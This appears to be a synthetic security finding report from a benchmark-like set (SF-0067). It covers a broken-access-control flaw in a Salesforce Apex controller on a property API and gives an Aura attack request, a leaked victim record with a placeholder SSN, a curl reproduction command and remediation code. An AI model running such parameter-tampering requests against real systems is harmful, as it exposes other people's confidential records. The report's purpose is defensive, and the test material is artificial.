# Security Analysis Report
**System:** EstateFlow Property API (Salesforce-Integrated)
**Domain:** Real Estate / PropTech
**Example ID:** SF-0067
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BAC — Pattern 2.4 | Privilege escalation via parameter tampering on `OpportunityController.getOpportunity` — attacker reads any property Opportunity record |

---

## Finding 1 — BAC: Privilege Escalation via Parameter Tampering on Opportunity Object (Pattern 2.4)

### Summary
The Apex controller `OpportunityController` on EstateFlow Property API (`1fd8fc4d.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private on the Opportunity object. Per §5.0 Pattern 2.4, the client-controlled `opportunityId` parameter enables privilege escalation — an attacker substitutes a victim's `opportunityId` to read any property Opportunity record, bypassing ownership checks.

**Context.txt inconsistency (documented):** The Apex method in §4.0 is `getOpportunityDetails(String opportunityId, ...)` while the Aura descriptor in §6.0 is `c.OpportunityController.getOpportunity`. These names conflict. The HAR (§6.0) is the primary evidence — this analysis follows the HAR.

**Pattern:** 2.4 — Privilege escalation via parameter tampering (BAC)
**Affected controller:** `c.OpportunityController.getOpportunity`
**Affected endpoint:** `POST https://1fd8fc4d.lightning.force.com/aura`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://1fd8fc4d.lightning.force.com/aura
Authorization: Bearer 00D1FD8FC4D!AR1fd8fc4d...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00D1FD8FC4D!AR1fd8fc4d...

message={"actions":[{"id":"1;a","descriptor":"c.OpportunityController.getOpportunity","callingDescriptor":"UNKNOWN",
"params":{"opportunityId":"001FC4D","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}
&aura.token=undefined
```

**Response — Victim Opportunity Record Returned**
```json
{
  "actions": [{ "id": "1;a", "state": "SUCCESS", "returnValue": { "records": [{
    "Id": "001FC4D", "Name": "Victim Opportunity Record", "OwnerId": "005VICTIM",
    "InternalNotes__c": "CONFIDENTIAL: internal review notes",
    "SensitiveData__c": "SSN: 000-65-3257"
  }] }, "error": [] }]
}
```

### Steps to Reproduce
```bash
SESSION="00D1FD8FC4D!AR1fd8fc4d..."
curl -s -X POST "https://1fd8fc4d.lightning.force.com/aura" \
  -H "Authorization: Bearer $SESSION" -H "Content-Type: application/x-www-form-urlencoded" -H "X-SFDC-Session: $SESSION" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.OpportunityController.getOpportunity","callingDescriptor":"UNKNOWN","params":{"opportunityId":"001FC4D","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
# Vulnerable: state: SUCCESS, OwnerId: 005VICTIM, SensitiveData__c: SSN: 000-65-3257
# Secure: state: ERROR — INSUFFICIENT_ACCESS
```

### Remediation
1. `public with sharing class OpportunityController { ... }`
2. `WHERE Id = :opportunityId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Server-side `fields` allowlist. Validate `aura.token`.
